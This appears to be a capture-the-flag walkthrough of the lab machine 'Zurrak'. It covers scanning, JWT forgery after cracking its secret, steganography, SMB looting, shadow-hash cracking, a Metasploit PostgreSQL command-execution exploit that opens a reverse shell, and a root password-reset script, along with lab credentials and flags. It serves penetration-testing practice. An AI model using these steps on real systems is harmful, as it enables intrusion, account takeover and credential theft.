# BOX NAME: Zurrak

**LINK**: https://downloads.hackmyvm.eu/zurrak.zip

<details open="open"><summary><ins>SUMMARY</ins></summary>

```
Remote Enumeration:
        Target IP: 10.77.0.13
        Open Ports: 80 (HTTP), 139 (NetBIOS-SSN), 445 (Microsoft-DS), 5432 (PostgreSQL)
        Identified Services: Apache HTTP Server, Samba, PostgreSQL

    Fuzzing:
        Discovered endpoints and potential vulnerabilities through web fuzzing techniques.
        Identified broken redirection and potential token manipulation in the web application.

    Initial Access:
        Exploited a vulnerability in PostgreSQL (CVE-2023-2015) to execute commands and gain a shell as the PostgreSQL user.
        Extracted credentials and used them to upload a malicious script (emergency.sh) to escalate privileges.

    Local Enumeration:
        Examined files of interest, including emergency.sh and user.txt.
        Conducted analysis on system files and user accounts for potential privilege escalation.

    Loot:
        Retrieved valuable information such as usernames, passwords, hashes, and potentially sensitive data from various sources, including files and databases.

    Proofs:
        Demonstrated successful exploitation, privilege escalation, and retrieval of user and root flags.

This summary outlines the key steps and findings in the penetration test of the CTF box named Zurrak.
```

</details>

# REMOTE ENUMERATION:

<ins>TARGET</ins>

```bash
[+] IP: 10.77.0.13  
[+] URL: http://10.77.0.13  
[+] FQDN: ?  
[+] DOMAIN: ?

```

<details open="open"><summary><ins>SCANNING</ins></summary>

**nmap-scan**

```bash
└─$ cat nmap-scan.log

# Nmap 7.94SVN scan initiated Sat Feb 3 09:59:27 2024 as: nmap -oN nmap/nmap-scan.log 10.77.0.13

Nmap scan report for 10.77.0.13  
Host is up (0.0061s latency).  
Not shown: 996 closed tcp ports (conn-refused)  
PORT STATE SERVICE  
80/tcp open http  
139/tcp open netbios-ssn  
445/tcp open microsoft-ds  
5432/tcp open postgresql

# Nmap done at Sat Feb 3 09:59:27 2024 -- 1 IP address (1 host up) scanned in 0.17 seconds

* * *

└─$ cat nmap-full-scan.log

# Nmap 7.94SVN scan initiated Sat Feb 3 09:59:41 2024 as: nmap -p- -A -sV -oN nmap/nmap-full-scan.log 10.77.0.13

Nmap scan report for 10.77.0.13  
Host is up (0.022s latency).  
Not shown: 65531 closed tcp ports (conn-refused)  
PORT STATE SERVICE VERSION  
80/tcp open http Apache httpd 2.4.57 ((Debian))  
| http-title: Login Page  
|\_Requested resource was login.php  
|\_http-server-header: Apache/2.4.57 (Debian)  
139/tcp open netbios-ssn Samba smbd 4.6.2  
445/tcp open netbios-ssn Samba smbd 4.6.2  
5432/tcp open postgresql PostgreSQL DB 9.6.0 or later  
| ssl-cert: Subject: commonName=zurrak  
| Subject Alternative Name: DNS:zurrak  
| Not valid before: 2023-10-20T19:29:16  
|*Not valid after: 2033-10-17T19:29:16  
| fingerprint-strings:  
| SMBProgNeg:  
| SFATAL  
| VFATAL  
| C0A000  
| Munsupported frontend protocol 65363.19778: server supports 3.0 to 3.0  
| Fpostmaster.c  
| L2195  
|* RProcessStartupPacket  
|\_ssl-date: TLS randomness does not represent time  
1 service unrecognized despite returning data. If you know the service/version, please submit the following fingerprint at https://nmap.org/cgi-bin/submit.cgi?new-service :  
SF-Port5432-TCP:V=7.94SVN%I=7%D=2/3%Time=65BE0088%P=x86_64-pc-linux-gnu%r(  
SF:SMBProgNeg,8C,"E\\0\\0\\0\\x8bSFATAL\\0VFATAL\\0C0A000\\0Munsupported\\x20front  
SF:end\\x20protocol\\x2065363.19778:\\x20server\\x20supports\\x203.0\\x20to\\x2  
SF:03.0\\0Fpostmaster.c\\0L2195\\0RProcessStartupPacket\\0\\0");

Host script results:  
| smb2-time:  
| date: 2024-02-03T08:59:57  
|_ start_date: N/A  
| smb2-security-mode:  
| 3:1:1:  
|_ Message signing enabled but not required

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .

# Nmap done at Sat Feb 3 10:00:03 2024 -- 1 IP address (1 host up) scanned in 22.50 seconds

```

**whatweb-scan**

```bash
└─$ whatweb $IP  
http://10.77.0.13 \[302 Found\] Apache\[2.4.57\], Bootstrap, Country\[RESERVED\]\[ZZ\], HTML5, HTTPServer\[Debian Linux\]\[Apache/2.4.57 (Debian)\], IP\[10.77.0.13\], JQuery, RedirectLocation\[login.php\], Script, Title\[Index\], X-UA-Compatible\[IE=edge\]  
http://10.77.0.13/login.php \[200 OK\] Apache\[2.4.57\], Bootstrap, Country\[RESERVED\]\[ZZ\], Email\[internal@zurrak.htb\], HTML5, HTTPServer\[Debian Linux\]\[Apache/2.4.57 (Debian)\], IP\[10.77.0.13\], JQuery, PasswordField\[password\], Script, Title\[Login Page\], X-UA-Compatible\[IE=edge\]

```

**nikto-scan**

```bash
└─$ nikto -h $URL

- Nikto v2.5.0

* * *

- Target IP: 10.77.0.13
- Target Hostname: 10.77.0.13
- Target Port: 80
- Start Time: 2024-02-03 12:25:02 (GMT1)

* * *

- Server: Apache/2.4.57 (Debian)
- /: The anti-clickjacking X-Frame-Options header is not present. See: https://developer.mozilla.org/en-US/docs/Web/HTTP/Headers/X-Frame-Options
- /: The X-Content-Type-Options header is not set. This could allow the user agent to render the content of the site in a different fashion to the MIME type. See: https://www.netsparker.com/web-vulnerability-scanner/vulnerabilities/missing-content-type-header/
- Root page / redirects to: login.php
- No CGI Directories found (use '-C all' to force check all possible dirs)  
- /login.php: Admin login page/section found.
- /composer.json: PHP Composer configuration file reveals configuration information. See: https://getcomposer.org/
- /composer.lock: PHP Composer configuration file reveals configuration information. See: https://getcomposer.org/
- 8102 requests: 0 error(s) and 5 item(s) reported on remote host
- End Time: 2024-02-03 12:25:13 (GMT1) (11 seconds)

* * *

- 1 host(s) tested

```

**CMS (content management system)**

```
.

```

**enum4linux**

```
.

```

**Other services**

DNS, SSH, FTP, TELNET, MYSQL, PROXY, SMTP, POP, IMAP, SMTP

```
.

```</details>
<details open="open"><summary><ins>FUZZING</ins></summary>

**WEBSERVER**

```bash
403 GET 9l 28w 275c Auto-filtering found 404-like response and created new filter; toggle off with --dont-filter  
404 GET 9l 31w 272c Auto-filtering found 404-like response and created new filter; toggle off with --dont-filter  
302 GET 51l 192w 2624c http://10.77.0.13/admin.php => login.php  
302 GET 22l 48w 1270c http://10.77.0.13/ => login.php  
301 GET 9l 28w 309c http://10.77.0.13/vendor => http://10.77.0.13/vendor/  
301 GET 9l 28w 318c http://10.77.0.13/vendor/composer => http://10.77.0.13/vendor/composer/  
200 GET 21l 168w 1070c http://10.77.0.13/vendor/composer/LICENSE

```

# SYNOPSIS

> First we use the information currently gathered. The port scans, the web-fuzzing, and others and start doing some manual labor, so to speak.  
> I'll usually start by looking at the web-page and the source code for some low-hanging fruit. et vòila!
> 
> When visiting the source-code of the login.php we quickly find exposed credentials. From this we aslo deduce the domain is zurrak.htb and we will update this in our hosts file.

![f13a5904238e7583e70b0b409ec1c473.png](../_resources/f13a5904238e7583e70b0b409ec1c473-3.png)

> We use the credentials to gain access to the webserver which seems to be an internal testsite judging by the credentials. Once logged in we are met with a blank "Welcome" page titled "Index"  
> Upon inpsecting the source-code we see there is a broken redirection to /admin.php and we are also given a cookie name with what looks like JWT_token.
> 
> So to access the /admin.php page we most likely need to manipulate said token.

![9f74d0672e733374326bc269c50fb546.png](../_resources/9f74d0672e733374326bc269c50fb546-3.png)

> token:eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJlbWFpbCI6ImludGVybmFsQHp1cnJhay5odGIiLCJpc0FkbWluIjpmYWxzZSwiaWF0IjoxMzU2OTk5NTI0LCJuYmYiOjEzNTcwMDAwMDB9.ufkwBsusc4IEYCCRszCbcSEv6irCtUSx-Uq08OThxso  
> If we decode it @ "https://jwt.io" we get:

![b9ed163b7c2e6e619da755768778f9cd.png](../_resources/b9ed163b7c2e6e619da755768778f9cd-3.png)

> If we change the field "isAdmin" to "isAdmin": true, reload the token in the browser, we'll probably be given some extra access. But to do this, we need the token-secret.  
> So we save the token into a jwt_hash.txt and try to crack it with hashcat using:
> 
> hashcat -m 16500 jwt_hash.txt /base/dbase/wordlists/password/rockyou.txt

![9221e9f6f7d2e267ef6319e457e9401c.png](../_resources/9221e9f6f7d2e267ef6319e457e9401c-3.png)

> So by adding TEST123 into the field "your-256-bit-secret" and changing the value to true for "isAdmin" and enter this new token in the browser, refresh the page, and try to visit /admin.php  
> we get access, like so.

![237cd2dd2455c53be2e495987a1563a2.png](../_resources/237cd2dd2455c53be2e495987a1563a2-3.png)

> I get some indications on the site there is a share named "share" and that we could, in an emergency, upload a emergency.sh to. But I don't have any credentials for it.  
> The pictures, the horse, snake, and hearts seem very suspicious. Let's grab them and analyze using tools such as exiftool, stegseek, and so on.
> 
> After a while I realize that "zurrakhearts.jpg" spits out a binary named "asli.exe". Here I got stuck since analyzing binaries is not my strong suit and frankly, the credentials taken from this are so far fetched it's no wonder I got stuck.
> 
> Quick summary ... there's a **main()** function in the binary encoded in char and hex. The string decoded is "ilovecats" and the username is the original name of the binary itself. The credentials gives us access to the smb share "**share**" but since the samba is configured in a way that does not let us enumare it. This is all guesses and guestimates.  
> <ins>Commands used:</ins>  
> steghide extract -sf zurrakhearts.jpg  
> smbclient [//10.77.0.13/share](//10.77.0.13/share) -U asli%ilovecats

![4dedac89884691f8f3a977cf85025173.png](../_resources/4dedac89884691f8f3a977cf85025173-3.png)

> Lets grab it all:  
> smbget --recursive smb://10.77.0.13/share/ --user asli%ilovecats  
> My oh my..

![2bdea7839edc6e41b5768f73000d6990.png](../_resources/2bdea7839edc6e41b5768f73000d6990-3.png)

> What a treasure-trove! so many things. Got a bunch of credentials, found an old vmdk for a old zurrak deployment. Found employee-information with names, numbers, emails, CC-info. Feels quite real.  
> So what I've spent the last few hours on is doing a case in "**AUTOPSY**" on this b\*tch, just for the hell of it! It's good to practice my DFIR-skills when given a chance. It might be a dead-end because the indication before was to upload a emergency.sh to the share which I haven't tried yet. If that's just a reverse shell to get a foothold I'll rather try this much much longer approach first. So bare with me!  
> I started with firing up a Windows Sandbox (geez, I really should consider getting myself a dedicated VM for analyzing stuff, maybe a FLARE box)

![5d1dbb79e46c003e0f5344bf5c2c9df8.png](../_resources/5d1dbb79e46c003e0f5344bf5c2c9df8-3.png)

> 1.  Transfer all the files. Install QEMU & Autopsy.
>     
> 2.  convert vmdk to raw-disk using qemu: **qemu-img.exe convert zurrak.old.vmdk -p -O raw zurrak-converted.raw**
>     
> 3.  Inspect the drive. I wen't for the passwd/shadow file and tried to crack it. With success! found the password for the postgres account and managed to remotely connect to the database.
>     
> 
> <ins>Commands used:</ins>  
> **unshadow passwd shadow > linux-hashes.txt**  
> **hashcat -m 1800 linux-hashes.txt /base/dbase/wordlist/password/rockyou.txt**  
> **psql -U postgres -p 5432 -h zurrak.htb**
> 
> <ins>COMMANDS TO NAVIGATE PSQL  
> \\dt  
> \\dit  
> \\l  
> </ins>

![dcec7f65d250c4948e74cc2856edfbbe.png](../_resources/dcec7f65d250c4948e74cc2856edfbbe-3.png)

![d2f9b4e46066b79f09796d02b699a9d1.png](../_resources/d2f9b4e46066b79f09796d02b699a9d1-3.png)

> I didn't manage to find anything juicy though. It seems the database is empty.

![319413e2f4466d5d56eb01892339738c.png](../_resources/319413e2f4466d5d56eb01892339738c-3.png)

</details>

# ACTIVE DIRECTORY:

<details open="open"><summary><ins>STRATEGY/METHODOLOGY</ins></summary>

**N/A**

</details>

# LOCAL ENUMERATION:

<details open="open"><summary><ins>FILES OF INTEREST</ins></summary>

**FILES**:

```
-rw------- 1 postgres postgres   28 Oct 24 16:47 emergency.sh
-rw-r--r-- 1 postgres postgres   33 Oct 20 20:23 user.txt

cat emergency.sh
echo "root:1234" | chpasswd
```

**SUID's**:

```
.

```

**SGID's**:

```
.

```

**OTHERS**:

```
.

```</details>

# LOOT

<details open="open"><summary><ins>USEFUL INFORMATION:</ins></summary>

**Kernel Info:**  
*file /bin/bash ; echo -e " \\n" && lsb_release -a ; echo -e "\\n" && uname -a*

```bash
meterpreter > sysinfo
Computer        : zurrak
OS              : Linux 6.1.0-13-amd64 #1 SMP PREEMPT_DYNAMIC Debian 6.1.55-1 (2023-09-29)
Architecture    : x64
System Language : en_US
Meterpreter     : python/linux
```

```bash
/bin/bash: ELF 64-bit LSB pie executable, x86-64, version 1 (SYSV), dynamically linked, interpreter /lib64/ld-linux-x86-64.so.2, BuildID[sha1]=0b6b11360e339f231f17484da2c87d0d78554e31, for GNU/Linux 3.2.0, stripped


No LSB modules are available.
Distributor ID: Debian
Description:    Debian GNU/Linux 12 (bookworm)
Release:        12
Codename:       bookworm


Linux zurrak 6.1.0-13-amd64 #1 SMP PREEMPT_DYNAMIC Debian 6.1.55-1 (2023-09-29) x86_64 GNU/Linux
```

</details><details open="open"><summary><ins>CREDS:</ins></summary>

**username:password**

```bash
internal@zurrak.htb:testsite
asli:ilovecats
postgres:baller15
emir:Tlyu4#f  
john:O0p12Az  
freddie:KAsz241  
albert:Lqak25r4
emre:daily666

::Other potential usernames::
robert:
eric:  
jwhite:  
aborden:  
mgreen:  
jmunsch:  
raragon:  
jrussell:  
lvenson:  
tconley:  
cjackson:  
sdavis:  
gwatson:  
lgarrison:  
jrenfro:  
jheard:  
dreyes:  
mhall:  
mmceachern:  
cdiaz:  
tlowe:  
loyola:  
amorrison:  
tsantos:  
vfaulkner:  
aiorio:  
tkaminski:  
redwards:  
speacock:  
anelson:  
mtownsend:  
rzwick:
```

**hashes**

```bash
JWT_TOKEN:eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJlbWFpbCI6ImludGVybmFsQHp1cnJhay5odGIiLCJpc0FkbWluIjpmYWxzZSwiaWF0IjoxMzU2OTk5NTI0LCJuYmYiOjEzNTcwMDAwMDB9.ufkwBsusc4IEYCCRszCbcSEv6irCtUSx-Uq08OThxso:TEST123  
postgres:$6$ZaTjsuy0$rBmhDDcT45A.p6chCl53MNn3c3k2lKjSn5sneyxOxaVpozADMVScztCYmdyexb4Gy7IvwlbBwzvRd.krKqT1L/:baller15

```</details>

# PROOFS

<details open="open"><summary><ins>INITAL ACCESS</ins></summary>

```bash
CODE:
msf6 exploit(multi/postgres/postgres_copy_from_program_cmd_exec) > run

[*] Started reverse TCP handler on 10.77.0.229:4444
[*] 10.77.0.21:5432 - 10.77.0.21:5432 - PostgreSQL 15.3 (Debian 15.3-0+deb12u1) on x86_64-pc-linux-gnu, compiled by gcc (Debian 12.2.0-14) 12.2.0, 64-bit
[*] 10.77.0.21:5432 - Exploiting...
[+] 10.77.0.21:5432 - 10.77.0.21:5432 - llmd0uFrHze dropped successfully
[+] 10.77.0.21:5432 - 10.77.0.21:5432 - llmd0uFrHze created successfully
[+] 10.77.0.21:5432 - 10.77.0.21:5432 - llmd0uFrHze copied successfully(valid syntax/command)
[+] 10.77.0.21:5432 - 10.77.0.21:5432 - llmd0uFrHze dropped successfully(Cleaned)
[*] 10.77.0.21:5432 - Exploit Succeeded
[*] Command shell session 1 opened (10.77.0.229:4444 -> 10.77.0.21:49658) at 2024-02-17 08:25:06 +0100

PAYLOAD:
msf6 exploit(multi/postgres/postgres_copy_from_program_cmd_exec)

id
uid=101(postgres) gid=110(postgres) groups=110(postgres),109(ssl-cert)
```

</details><details open="open"><summary><ins>PIVOTING OR PRIVILEGE ESCALATION</ins></summary>  

```bash
CODE:
Found credentials in fstab
//127.0.0.1/internal    uid=emre, pw=daily666
smbclient \\\\127.0.0.1/internal -U emre%daily666 -c "put emergency.sh"

PAYLOAD:
postgres@zurrak:/var/lib/postgresql/15/main$ su -
Password: 1234

root@zurrak:~# cd /root/
root@zurrak:~# ls
bash_history  root.txt
root@zurrak:~# cat root.txt
66fce7650a88ac2afd99d061e1c6a4df
```

</details><details open="open"><summary><ins>FLAGS</ins></summary>

```bash
USER:
fe8f97f109ceb0362c95e60338c4c1a8

ROOT:
66fce7650a88ac2afd99d061e1c6a4df
```

</details>